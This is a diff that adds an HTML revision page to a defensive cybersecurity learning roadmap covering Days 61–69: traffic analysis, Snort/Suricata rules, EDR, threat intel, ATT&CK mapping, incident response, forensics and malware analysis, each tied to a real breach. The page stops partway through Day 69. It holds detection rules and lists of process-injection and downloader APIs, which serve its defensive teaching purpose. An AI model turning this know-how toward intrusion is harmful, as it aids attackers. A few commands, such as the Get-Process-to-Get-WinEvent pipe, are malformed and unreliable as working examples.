@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Revision — Day 61 to Day 70</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600;700&family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{--bg:#0a0e0f;--panel:#10171a;--edge:#1c2528;--green:#39ff88;--cyan:#4fd1ff;--amber:#ffb454;--red:#ff5c5c;--purple:#b389ff;--pink:#ff6bd6;--text:#e6edf0;--muted:#7d8590;}
+  *{box-sizing:border-box;margin:0;padding:0;}
+  body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;line-height:1.65;background-image:radial-gradient(circle at 10% 0%,rgba(57,255,136,0.06),transparent 40%),radial-gradient(circle at 90% 10%,rgba(79,209,255,0.05),transparent 40%);}
+  .wrap{max-width:960px;margin:0 auto;padding:40px 22px 100px;}
+
+  .topbar{display:flex;justify-content:space-between;align-items:center;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);border-bottom:1px solid var(--edge);padding-bottom:14px;margin-bottom:30px;flex-wrap:wrap;gap:10px;}
+
+  .hero{background:var(--panel);border:1px solid var(--edge);border-radius:14px;padding:30px 28px;margin-bottom:36px;}
+  .hero-tag{font-family:'IBM Plex Mono',monospace;color:var(--amber);font-size:12px;background:rgba(255,180,84,0.08);border:1px solid rgba(255,180,84,0.3);padding:4px 12px;border-radius:20px;display:inline-block;margin-bottom:14px;}
+  .hero h1{font-family:'IBM Plex Mono',monospace;font-weight:700;font-size:clamp(24px,4vw,36px);line-height:1.2;margin-bottom:10px;}
+  .hero h1 span{color:var(--green);}
+  .hero p{color:var(--muted);font-size:14.5px;max-width:640px;}
+  .stat-row{display:flex;gap:12px;flex-wrap:wrap;margin-top:20px;}
+  .stat{background:var(--bg);border:1px solid var(--edge);border-radius:8px;padding:12px 16px;min-width:100px;}
+  .stat .num{font-family:'IBM Plex Mono',monospace;font-size:22px;color:var(--cyan);font-weight:700;}
+  .stat .lbl{font-size:11px;color:var(--muted);text-transform:uppercase;margin-top:2px;}
+
+  .day-card{background:var(--panel);border:1px solid var(--edge);border-radius:14px;padding:22px 24px;margin-bottom:20px;}
+  .day-header{display:flex;align-items:flex-start;gap:16px;margin-bottom:16px;}
+  .day-num{font-family:'IBM Plex Mono',monospace;font-weight:700;font-size:28px;color:var(--green);min-width:60px;flex-shrink:0;line-height:1;}
+  .day-meta{}
+  .day-title{font-weight:700;font-size:17px;margin-bottom:4px;}
+  .day-incident{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--red);background:rgba(255,92,92,0.08);border:1px solid rgba(255,92,92,0.2);padding:3px 9px;border-radius:12px;display:inline-block;}
+
+  .section-label{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:8px;margin-top:14px;}
+
+  .concept-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:8px;margin-top:8px;}
+  .concept{background:var(--bg);border:1px solid var(--edge);border-radius:8px;padding:10px 12px;}
+  .concept .ctitle{font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);margin-bottom:4px;font-weight:600;}
+  .concept .cdesc{font-size:12px;color:var(--muted);}
+
+  .qa{border-left:3px solid var(--purple);padding-left:14px;margin-top:10px;}
+  .qa .q{font-weight:600;font-size:13px;color:var(--text);margin-bottom:5px;}
+  .qa .a{font-size:12.5px;color:#b8c2c6;line-height:1.6;}
+
+  .quiz-section{background:var(--panel);border:1px solid var(--edge);border-radius:14px;padding:26px 28px;margin-top:36px;}
+  .quiz-section h2{font-family:'IBM Plex Mono',monospace;color:var(--amber);font-size:18px;margin-bottom:6px;}
+  .quiz-section .sub{color:var(--muted);font-size:13.5px;margin-bottom:20px;}
+  .q-item{background:var(--bg);border:1px solid var(--edge);border-radius:8px;padding:14px 16px;margin-bottom:10px;}
+  .q-item .qnum{font-family:'IBM Plex Mono',monospace;font-size:10px;color:var(--muted);margin-bottom:5px;}
+  .q-item .qtext{font-size:13.5px;color:var(--text);font-weight:600;margin-bottom:8px;}
+  .q-item .ans{font-size:12.5px;color:var(--green);font-family:'IBM Plex Mono',monospace;background:rgba(57,255,136,0.05);border:1px solid rgba(57,255,136,0.15);border-radius:5px;padding:6px 10px;}
+
+  .command-table{margin-top:10px;}
+  .cmd-row{display:flex;gap:12px;align-items:flex-start;background:var(--bg);border:1px solid var(--edge);border-radius:7px;padding:9px 12px;margin-bottom:6px;}
+  .cmd-row code{font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--green);flex-shrink:0;min-width:200px;}
+  .cmd-row .cdesc{font-size:12px;color:var(--muted);}
+
+  .breach-timeline{margin-top:12px;}
+  .bt-row{display:flex;gap:14px;align-items:flex-start;padding:10px 0;border-bottom:1px solid var(--edge);}
+  .bt-row:last-child{border-bottom:none;}
+  .bt-row .year{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--red);min-width:80px;flex-shrink:0;}
+  .bt-row .incident{font-weight:600;font-size:13px;min-width:200px;flex-shrink:0;}
+  .bt-row .detail{font-size:12.5px;color:var(--muted);}
+
+  .ai-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:8px;margin-top:10px;}
+  .ai-pill{background:rgba(255,107,214,0.04);border:1px solid rgba(255,107,214,0.18);border-radius:8px;padding:10px 12px;}
+  .ai-pill .aname{font-family:'IBM Plex Mono',monospace;font-size:11.5px;color:var(--pink);font-weight:700;margin-bottom:3px;}
+  .ai-pill .adesc{font-size:11px;color:var(--muted);}
+
+  .job-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:10px;margin-top:10px;}
+  .job-box{background:rgba(57,255,136,0.04);border:1px solid rgba(57,255,136,0.15);border-radius:8px;padding:12px 14px;}
+  .job-box .day-ref{font-family:'IBM Plex Mono',monospace;font-size:10px;color:var(--green);margin-bottom:5px;}
+  .job-box .bullet{font-size:12.5px;color:#cdd6da;}
+
+  .next-up{background:linear-gradient(135deg,rgba(57,255,136,0.05),rgba(79,209,255,0.03));border:1px solid var(--edge);border-radius:12px;padding:20px 24px;display:flex;justify-content:space-between;align-items:center;gap:16px;flex-wrap:wrap;margin-top:36px;}
+  .next-up .label{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--muted);margin-bottom:4px;}
+  .next-up .title{font-weight:700;font-size:16px;}
+  .next-up .arrow{font-family:'IBM Plex Mono',monospace;color:var(--cyan);font-size:24px;}
+
+  footer{margin-top:28px;text-align:center;color:var(--muted);font-size:12px;font-family:'IBM Plex Mono',monospace;}
+  @media(max-width:600px){.wrap{padding:26px 14px 70px;} .cmd-row{flex-wrap:wrap;} .bt-row{flex-wrap:wrap;}}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div class="topbar">
+    <span>robin@gcek-it:~/roadmap$ cat revision_day61_to_day70.md</span>
+    <span style="color:var(--green);">Phase 4 — Detection, Forensics & Intelligence</span>
+  </div>
+
+  <!-- HERO -->
+  <div class="hero">
+    <div class="hero-tag">REVISION — DAY 61 TO DAY 70</div>
+    <h1>Detection & Response Deep Dive. <span>Phase 4 solidification.</span></h1>
+    <p>Days 61–70 cover the full detection and response pipeline: Wireshark traffic analysis, Snort/Suricata intrusion detection, EDR telemetry, threat intelligence feeds, MITRE ATT&CK mapping, incident response lifecycle, digital forensics, static and dynamic malware analysis, and proactive threat hunting. Every concept ties to real breaches.</p>
+    <div class="stat-row">
+      <div class="stat"><div class="num">10</div><div class="lbl">Days Done</div></div>
+      <div class="stat"><div class="num">10</div><div class="lbl">Real Incidents</div></div>
+      <div class="stat"><div class="num">12</div><div class="lbl">Tools Used</div></div>
+      <div class="stat"><div class="num">16</div><div class="lbl">Scripts Built</div></div>
+    </div>
+  </div>
+
+  <!-- DAY 61 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">61</div>
+      <div class="day-meta">
+        <div class="day-title">Network Traffic Analysis — Wireshark</div>
+        <span class="day-incident">Lazarus Group / Bangladesh Bank Heist</span>
+      </div>
+    </div>
+
+    <div class="section-label">// core concepts</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Wireshark Display Filters</div><div class="cdesc">`http.request`, `dns.qry.name`, `tcp.stream eq 0` — filter expressions isolate specific traffic types from noise.</div></div>
+      <div class="concept"><div class="ctitle">Follow TCP Stream</div><div class="cdesc">Right-click a TCP packet → Follow → TCP Stream. Reconstructs the entire conversation — HTTP requests, FTP commands, plaintext protocols.</div></div>
+      <div class="concept"><div class="ctitle">TLS Handshake Inspection</div><div class="cdesc">`tls.handshake.type` shows ClientHello, ServerHello, Certificate exchange. Cipher suite negotiation is visible packet by packet.</div></div>
+      <div class="concept"><div class="ctitle">Export Objects</div><div class="cdesc">File → Export Objects → HTTP/SMB. Extract files transferred over the wire without manual reassembly.</div></div>
+    </div>
+
+    <div class="section-label">// the real incident</div>
+    <p style="font-size:13.5px;color:#cdd6da;"><strong>Bangladesh Bank Heist (2016):</strong> Lazarus Group (DPRK) infiltrated Bangladesh Bank's SWIFT network and sent fraudulent transfer requests totaling $951M. Forensic analysts used Wireshark to dissect captured SWIFT message traffic, reconstructing the exact sequence of fraudulent messages and identifying the command-and-control IPs used for the transfers. $101M was stolen before the remaining requests were blocked by a typo in a beneficiary name.</p>
+
+    <div class="section-label">// commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>tshark -r capture.pcap -Y "http.request"</code><div class="cdesc">Filter and display all HTTP request packets from a saved capture file.</div></div>
+      <div class="cmd-row"><code>tshark -r capture.pcap -Y "tcp.port==443" -T fields -e ip.src -e ip.dst -e tls.handshake.ciphersuite</code><div class="cdesc">Extract TLS handshake details — source, destination, negotiated cipher suite.</div></div>
+      <div class="cmd-row"><code>wireshark capture.pcap</code><div class="cdesc">Open PCAP in GUI for interactive analysis with display filters, streams, and exports.</div></div>
+      <div class="cmd-row"><code>tcpdump -i eth0 -w live.pcap</code><div class="cdesc">Capture live traffic to a file for later analysis in Wireshark.</div></div>
+    </div>
+
+    <div class="section-label">// interview answer</div>
+    <div class="qa">
+      <div class="q">Q: How would you identify a suspicious DNS query in Wireshark?</div>
+      <div class="a">Apply filter `dns.qry.name` and sort by length. DGA-based malware generates long, random-looking subdomains (e.g., `asdfghjkl1234.malware.com`). Legitimate queries are short and readable. Export the DNS query names and check against threat intel feeds.</div>
+    </div>
+  </div>
+
+  <!-- DAY 62 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">62</div>
+      <div class="day-meta">
+        <div class="day-title">Intrusion Detection — Snort / Suricata</div>
+        <span class="day-incident">Snort — Top IDS Deployments Worldwide</span>
+      </div>
+    </div>
+
+    <div class="section-label">// core concepts</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">IDS vs IPS</div><div class="cdesc">IDS alerts only (passive). IPS sits inline and blocks traffic matching rules. Same rules engine, different action.</div></div>
+      <div class="concept"><div class="ctitle">Snort Rule Anatomy</div><div class="cdesc">`alert tcp any any -> $HOME_NET 445 (msg:"EternalBlue"; content:"|00 00 00 31 ff|"; sid:1000001;)` — action, protocol, source, destination, rule body.</div></div>
+      <div class="concept"><div class="ctitle">Rule Actions</div><div class="cdesc">`alert` logs and alerts. `drop` blocks and logs (IPS mode). `reject` blocks and sends TCP RST. `pass` ignores matching traffic.</div></div>
+      <div class="concept"><div class="ctitle">PCAP Replay Testing</div><div class="cdesc">Run Snort or Suricata against known malicious PCAPs to validate rules before deploying to production.</div></div>
+    </div>
+
+    <div class="section-label">// key statistics</div>
+    <p style="font-size:13.5px;color:#cdd6da;">Snort remains the #1 deployed open-source IDS globally with 5M+ downloads and 40,000+ detection rules. Suricata adds GPU acceleration and native HTTP/2 parsing. Both use the same rule format but Suricata can handle 10Gbps+ line rates with proper tuning.</p>
+
+    <div class="section-label">// commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>snort -c /etc/snort/snort.conf -i eth0</code><div class="cdesc">Start Snort IDS on interface eth0 with specified config file.</div></div>
+      <div class="cmd-row"><code>snort -r capture.pcap -c snort.conf -A fast</code><div class="cdesc">Run Snort against a saved PCAP file — test rules offline.</div></div>
+      <div class="cmd-row"><code>suricata -c /etc/suricata/suricata.yaml -i eth0</code><div class="cdesc">Start Suricata IPS/IDS with YAML configuration.</div></div>
+      <div class="cmd-row"><code>suricata -r capture.pcap -l /var/log/suricata/</code><div class="cdesc">Analyze PCAP with Suricata, write alerts to log directory.</div></div>
+      <div class="cmd-row"><code>tail -f /var/log/suricata/fast.log</code><div class="cdesc">Monitor real-time Suricata alerts as they fire.</div></div>
+    </div>
+
+    <div class="section-label">// interview answer</div>
+    <div class="qa">
+      <div class="q">Q: Write a Snort rule that alerts when a internal host connects to a known malware C2 on TCP port 8443.</div>
+      <div class="a">`alert tcp $HOME_NET any -> 192.168.1.100 8443 (msg:"Malware C2 beacon detected"; content:"|00 01 02|"; classtype:trojan-activity; sid:1000002; rev:1;)` — source is internal, destination is the C2 IP and port, content match checks for known beacon pattern.</div>
+    </div>
+  </div>
+
+  <!-- DAY 63 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">63</div>
+      <div class="day-meta">
+        <div class="day-title">Endpoint Detection & Response (EDR) Basics</div>
+        <span class="day-incident">CrowdStrike Falcon — Hafnium Response 2021</span>
+      </div>
+    </div>
+
+    <div class="section-label">// core concepts</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">AV vs EDR</div><div class="cdesc">AV checks file hashes against known signatures. EDR watches behavior — process creation, registry changes, network connections, memory access patterns.</div></div>
+      <div class="concept"><div class="ctitle">Fileless Malware Detection</div><div class="cdesc">Malware that runs entirely in memory (PowerShell, WMI, .NET reflection) has no file to scan. EDR catches it by monitoring for unusual PowerShell spawning from Office or suspicious WMI event subscriptions.</div></div>
+      <div class="concept"><div class="ctitle">LSASS Protection</div><div class="cdesc">Windows LSASS.exe holds all logged-on user credentials. EDR detects PPL bypass attempts and suspicious OpenProcess calls targeting LSASS.</div></div>
+      <div class="concept"><div class="ctitle">Process Injection Telemetry</div><div class="cdesc">EDR flags CreateRemoteThread, WriteProcessMemory, SetWindowsHookEx — common injection APIs. Legitimate software rarely calls these.</div></div>
+    </div>
+
+    <div class="section-label">// the real incident</div>
+    <p style="font-size:13.5px;color:#cdd6da;"><strong>Hafnium Attacks (2021):</strong> Chinese state-sponsored group exploited four zero-days in Microsoft Exchange (CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, CVE-2021-27065). CrowdStrike Falcon EDR detected anomalous w3wp.exe (Exchange worker process) behavior within minutes — webshell deployment, unusual PowerShell execution, and suspicious outbound connections. EDR telemetry enabled global containment within hours.</p>
+
+    <div class="section-label">// commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>Get-Process -Name w3wp | Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-IIS-Logging/Operational'}</code><div class="cdesc">Check IIS worker process for suspicious activity — Hafnium left webshell traces here.</div></div>
+      <div class="cmd-row"><code>wevtutil qe Security /q:"*[System[EventID=4688]]" /c:50 /f:text</code><div class="cdesc">Query Windows Event Log for process creation events — detect anomalous process chains.</div></div>
+    </div>
+
+    <div class="section-label">// interview answer</div>
+    <div class="qa">
+      <div class="q">Q: How does EDR detect a fileless attack that never touches disk?</div>
+      <div class="a">EDR monitors API calls in real time. If a Word macro invokes PowerShell to call Win32 API via .NET reflection without dropping a file, EDR sees the process tree: WINWORD.EXE → powershell.exe → cscript.exe. That chain is itself the alert — no file hash needed. Event ID 4688 (process creation) with suspicious parent-child relationships is the key telemetry.</div>
+    </div>
+  </div>
+
+  <!-- DAY 64 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">64</div>
+      <div class="day-meta">
+        <div class="day-title">Threat Intelligence Basics</div>
+        <span class="day-incident">MISP — Kaseya Supply-Chain Response 2021</span>
+      </div>
+    </div>
+
+    <div class="section-label">// core concepts</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">STIX & TAXII</div><div class="cdesc">STIX (Structured Threat Information Expression) is the JSON format for IoCs. TAXII is the transport protocol to share them. MISP supports both.</div></div>
+      <div class="concept"><div class="ctitle">IoC Tiers</div><div class="cdesc">Level 1: Hash (easy to change). Level 2: IP/Domain (moderate). Level 3: Behavioral/yara rule (hard to evade). Level 4: TTP (hardest — attacker must change how they operate).</div></div>
+      <div class="concept"><div class="ctitle">MISP Platform</div><div class="cdesc">Open-source threat intelligence sharing platform. Create events, add attributes (IPs, hashes, domains), set TLP (Traffic Light Protocol) for sharing restrictions.</div></div>
+      <div class="concept"><div class="ctitle">CTI Lifecycle</div><div class="cdesc">Direction (what to collect) → Collection → Processing → Analysis → Dissemination → Feedback. Intelligence that isn't acted on has no value.</div></div>
+    </div>
+
+    <div class="section-label">// the real incident</div>
+    <p style="font-size:13.5px;color:#cdd6da;"><strong>Kaseya Supply-Chain Ransomware (July 2021):</strong> REvil ransomware pushed through Kaseya's VSA remote management software to 1,500+ downstream organizations. MISP enabled real-time IoC sharing across 1,000+ organizations within hours of Discovery. The first STIX feed containing C2 IPs, YARA rules, and file hashes was published before many victims even knew they were compromised. This is intelligence operationalization at scale.</p>
+
+    <div class="section-label">// commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>curl -H "Authorization: <api_key>" -X POST https://misp.local/events -d @event.json</code><div class="cdesc">Push a new threat intelligence event to MISP via REST API.</div></div>
+      <div class="cmd-row"><code>stix2-validator report.json</code><div class="cdesc">Validate a STIX 2.1 report before publishing — catches schema errors.</div></div>
+    </div>
+  </div>
+
+  <!-- DAY 65 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">65</div>
+      <div class="day-meta">
+        <div class="day-title">MITRE ATT&CK Framework</div>
+        <span class="day-incident">Mandiant / SolarWinds APT29 Attribution</span>
+      </div>
+    </div>
+
+    <div class="section-label">// core concepts</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">ATT&CK Matrix Structure</div><div class="cdesc">14 tactic columns (Initial Access → Exfiltration) × technique rows per tactic. Each technique has an ID: T1078 (Valid Accounts), T1133 (External Remote Services).</div></div>
+      <div class="concept"><div class="ctitle">Tactics vs Techniques</div><div class="cdesc">Tactic = the WHY (what the attacker is trying to achieve). Technique = the HOW (specific method used). Same technique can serve multiple tactics.</div></div>
+      <div class="concept"><div class="ctitle">Sub-Techniques</div><div class="cdesc">Refinements: T1059.001 = PowerShell, T1059.003 = Windows Command Shell, T1059.005 = Visual Basic. Enables precise detection rules.</div></div>
+      <div class="concept"><div class="ctitle">ATT&CK Navigator</div><div class="cdesc">Web-based tool to layer techniques. Red = detected, Orange = partial, Grey = undetected. Instant visual gap analysis.</div></div>
+    </div>
+
+    <div class="section-label">// the real incident</div>
+    <p style="font-size:13.5px;color:#cdd6da;"><strong>SolarWinds / APT29 (2020):</strong> Mandiant mapped 15+ MITRE ATT&CK techniques across the full kill chain: T1195 (Supply Chain Compromise) for the initial SolarWinds Orion compromise, T1078 (Valid Accounts) for credential abuse, T1133 (External Remote Services) for VPN persistence, T1553 (Subvert Trust Controls) for code signing, and T1564 (Hide Artifacts) for log deletion. This technique pattern uniquely identified APT29 (Cozy Bear) as the actor.</p>
+
+    <div class="section-label">// commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>cat attack_chain.json | jq '.techniques[] | "\(.id) - \(.name)"'</code><div class="cdesc">Extract technique IDs and names from a mapped attack chain JSON for documentation.</div></div>
+      <div class="cmd-row"><code>python3 attack-navigator.py --input coverage.json --output heatmap.html</code><div class="cdesc">Generate ATT&CK Navigator layer from detection coverage data — visual gap analysis.</div></div>
+    </div>
+
+    <div class="section-label">// interview answer</div>
+    <div class="qa">
+      <div class="q">Q: How would you use MITRE ATT&CK to identify gaps in a SOC's detection coverage?</div>
+      <div class="a">Map every current detection rule or alert to its corresponding ATT&CK technique. Load into Navigator: every uncolored cell is a gap. Prioritize coverage for techniques most commonly used against your industry. For example, if you have no detection for T1059.001 (PowerShell), attackers can run fileless malware undetected. The matrix tells you exactly what you're missing.</div>
+    </div>
+  </div>
+
+  <!-- DAY 66 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">66</div>
+      <div class="day-meta">
+        <div class="day-title">Incident Response Lifecycle</div>
+        <span class="day-incident">NIST IR Framework — Colonial Pipeline 2021</span>
+      </div>
+    </div>
+
+    <div class="section-label">// NIST SP 800-61 phases</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">1. Preparation</div><div class="cdesc">Build IR plan, assemble team, pre-deploy logging and EDR. Most critical phase — 80% of response success depends on preparation done before the incident.</div></div>
+      <div class="concept"><div class="ctitle">2. Detection & Analysis</div><div class="cdesc">Alert triggers → triage → scope determination. Is this a real incident or a false positive? What systems are affected?</div></div>
+      <div class="concept"><div class="ctitle">3. Containment</div><div class="cdesc">Stop the bleeding. Isolate affected hosts, disable compromised accounts, block C2 IPs at firewall. Short-term vs long-term containment.</div></div>
+      <div class="concept"><div class="ctitle">4. Eradication</div><div class="cdesc">Remove the root cause. Patch vulnerabilities, delete malware, revoke certificates, rebuild compromised systems from clean media.</div></div>
+      <div class="concept"><div class="ctitle">5. Recovery</div><div class="cdesc">Restore from clean backups, bring services online, monitor for re-infection. Phased rollout preferred over full blast.</div></div>
+      <div class="concept"><div class="ctitle">6. Lessons Learned</div><div class="cdesc">Post-mortem report within 1-2 weeks. What went well? What failed? Update IR plan and controls. Without this phase, you repeat the same mistakes.</div></div>
+    </div>
+
+    <div class="section-label">// the real incident</div>
+    <p style="font-size:13.5px;color:#cdd6da;"><strong>Colonial Pipeline (May 2021):</strong> DarkSide ransomware breached Colonial's IT network via a compromised VPN password. The IR team followed the NIST lifecycle: isolated OT systems from IT (containment), refused to restore from backup until eradication was confirmed, rebuilt systems from clean media (eradication/recovery), and implemented MFA across all remote access within 2 weeks post-incident (lessons learned). The $4.4M ransom was paid, but the NIST framework saved the pipeline itself.</p>
+
+    <div class="section-label">// commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>iptables -A INPUT -s <attacker_ip> -j DROP</code><div class="cdesc">Immediate firewall containment — drop all traffic from known attacker IP.</div></div>
+      <div class="cmd-row"><code>psexec \\\\target -s cmd /c "net stop <malware_service>"</code><div class="cdesc">Remote service termination during eradication phase.</div></div>
+    </div>
+
+    <div class="section-label">// interview answer</div>
+    <div class="qa">
+      <div class="q">Q: Walk me through what you do in the first 15 minutes of a confirmed ransomware incident.</div>
+      <div class="q">A: Minute 1-3: Confirm the alert is not a false positive (check EDR console). Minute 3-5: Identify affected systems by checking detection scope. Minute 5-10: Isolate affected hosts by disconnecting network cables or disabling switch ports. Minute 10-12: Disable compromised user accounts in Active Directory. Minute 12-15: Escalate to IR lead and document everything. Containment is always the first priority.</div>
+    </div>
+  </div>
+
+  <!-- DAY 67 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">67</div>
+      <div class="day-meta">
+        <div class="day-title">Digital Forensics Basics</div>
+        <span class="day-incident">Sony Pictures Breach 2014</span>
+      </div>
+    </div>
+
+    <div class="section-label">// core concepts</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Forensic Imaging (dd)</div><div class="cdesc">`dd if=/dev/sda of=image.dd bs=4M` creates a bit-for-bit copy. Write-blocker prevents accidental modification during acquisition.</div></div>
+      <div class="concept"><div class="ctitle">File Carving (foremost/scalpel)</div><div class="cdesc">Recovers deleted files by scanning raw disk data for file headers (JFIF, PNG, PDF). Works even after files are "deleted" from filesystem.</div></div>
+      <div class="concept"><div class="ctitle">Timeline Analysis</div><div class="cdesc">Correlate MAC times (Modified, Accessed, Created) from filesystem metadata with log entries. Build a sequence of attacker actions in chronological order.</div></div>
+      <div class="concept"><div class="ctitle">Chain of Custody</div><div class="cdesc">Every forensic acquisition must be documented: who, what, when, where, how. SHA-256 hashes verify image integrity. Without chain of custody, evidence is inadmissible.</div></div>
+    </div>
+
+    <div class="section-label">// the real incident</div>
+    <p style="font-size:13.5px;color:#cdd6da;"><strong>Sony Pictures (November 2014):</strong> Attackers (attributed to DPRK's Lazarus Group) had access to Sony's network for over a month. Digital forensics revealed the full timeline: initial compromise via spear-phishing in September, lateral movement to administrative systems, exfiltration of 100TB+ of data through encrypted channels, and deployment of wiper malware that destroyed 3,000+ workstations and 500+ servers. Forensic analysis of the wiper binary's compile timestamps and debug paths tied it to previous DPRK malware samples.</p>
+
+    <div class="section-label">// commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>dd if=/dev/sda of=/evidence/image.dd bs=4096 conv=noerror,sync</div><div class="cdesc">Create forensic disk image with error handling — skip bad blocks but maintain offset alignment.</div></div>
+      <div class="cmd-row"><code>sha256sum image.dd > evidence.hash</code><div class="cdesc">Compute and store hash for chain of custody verification.</div></div>
+      <div class="cmd-row"><code>foremost -i image.dd -o /evidence/carved</code><div class="cdesc">Carve deleted files from disk image using file header signatures.</div></div>
+      <div class="cmd-row"><code>fls -m / -r image.dd > bodyfile.txt && mactime -b bodyfile.txt > timeline.csv</code><div class="cdesc">Build filesystem timeline from Sleuth Kit — MAC times for every file, sorted chronologically.</div></div>
+    </div>
+
+    <div class="section-label">// interview answer</div>
+    <div class="qa">
+      <div class="q">Q: What is the difference between live forensics and dead forensics?</div>
+      <div class="a">Live forensics captures volatile data (RAM, network connections, running processes) from a powered-on system — the attacker might still be active. Dead forensics analyzes a powered-off disk image — the system is preserved but volatile evidence is lost. Always acquire RAM before powering down. The order of volatility: CPU cache → RAM → network connections → disk processes → disk.</div>
+    </div>
+  </div>
+
+  <!-- DAY 68 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">68</div>
+      <div class="day-meta">
+        <div class="day-title">Malware Analysis — Static Basics</div>
+        <span class="day-incident">Stuxnet — Static Analysis Discovery</span>
+      </div>
+    </div>
+
+    <div class="section-label">// core concepts</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">PE Header Analysis</div><div class="cdesc">Portable Executable format. Check DOS header, NT header, section table (.text, .data, .rdata, .rsrc). Suspicious sections are often named differently or have unusual entropy.</div></div>
+      <div class="concept"><div class="ctitle">Import Address Table (IAT)</div><div class="cdesc">Lists every external DLL function a binary calls. `CreateRemoteThread` + `WriteProcessMemory` + `VirtualAllocEx` = process injection. `InternetOpenUrl` + `URLDownloadToFile` = downloader.</div></div>
+      <div class="concept"><div class="ctitle">String Analysis</div><div class="cdesc">`strings sample.exe` extracts embedded text: IP addresses, registry keys, mutex names, command-line arguments. Attacker mistakes in strings have identified APT groups.</div></div>
+      <div class="concept"><div class="ctitle">Compile Timestamps</div><div class="cdesc">PE header contains the compilation timestamp. Can be faked, but many malware samples don't bother. Correlating timestamps across samples helps attribute campaigns.</div></div>
+    </div>
+
+    <div class="section-label">// the real incident</div>
+    <p style="font-size:13.5px;color:#cdd6da;"><strong>Stuxnet Static Analysis (2010):</strong> Researchers at Kaspersky and Symantec performed static analysis that identified Stuxnet as a state-built cyberweapon. Key findings: two stolen digital certificates from RealTek and JMicron (legitimate companies), four zero-day exploits (including CVE-2010-2568 LNK vulnerability), Siemens WinCC Step-7 SCADA software targeting, and strings referencing Iranian nuclear facilities. Static analysis alone revealed the weapon's purpose without ever executing it.</p>
+
+    <div class="section-label">// commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>file sample.exe</code><div class="cdesc">Identify file type — confirms it's a PE32 executable for Windows.</div></div>
+      <div class="cmd-row"><code>sha256sum sample.exe</code><div class="cdesc">Compute hash — check against VirusTotal and threat intel databases.</div></div>
+      <div class="cmd-row"><code>strings sample.exe | sort -u | head -100</code><div class="cdesc">Extract unique strings — URLs, IPs, registry keys, error messages.</div></div>
+      <div class="cmd-row"><code>objdump -p sample.exe | grep -i "TimeDateStamp"</code><div class="cdesc">Extract compile timestamp from PE header for sample correlation.</div></div>
+      <div class="cmd-row"><code>pe-checksec sample.exe</code><div class="cdesc">Check binary security features — ASLR, DEP, SafeSEH, Control Flow Guard.</div></div>
+    </div>
+
+    <div class="section-label">// interview answer</div>
+    <div class="qa">
+      <div class="q">Q: What static indicators would make you suspect a binary is malicious?</div>
+      <div class="a">High entropy in non-packed sections (suggests encrypted/compressed payload), imports of both socket functions AND process injection functions, suspicious section names like `.upx0`, a compile timestamp that doesn't match the claimed version date, and strings containing C2 IPs, PowerShell commands, or registry persistence keys. Any one is suspicious; three or more is highly indicative.</div>
+    </div>
+  </div>
+
+  <!-- DAY 69 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">69</div>
+      <div class="day-meta">
+        <div class="day-title">Malware Analysis — Dynamic/Sandbox Basics</div>
+        <span class="day-incident">Dridex Banking Trojan — Cuckoo Sandbox</span>
+      </div>
+    </div>
+
+    <div class="section-label">// core concepts</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Sandbox Execution</div><div class="cdesc">Run malware in an isolated VM. Cuckoo and ANY.RUN capture every API call, file write, registry change, and network connection made during execution.</div></div>
+      <div class="concept"><div class="ctitle">API Monitoring</div><div class="cdesc">Every call to NtCreateFile, RegSetValue, InternetOpenUrl is logged. A single execution reveals C2 domains, persistence locations, and credential theft attempts.</div></div>
+      <div class="concept"><div class="ctitle">Network Behavior</div><div class="cdesc">DNS queries, HTTP/HTTPS POST requests (exfiltrated data), and beacon intervals are captured. Dridex checked in every 60 seconds — regular beaconing is a strong IoC.</div></div>
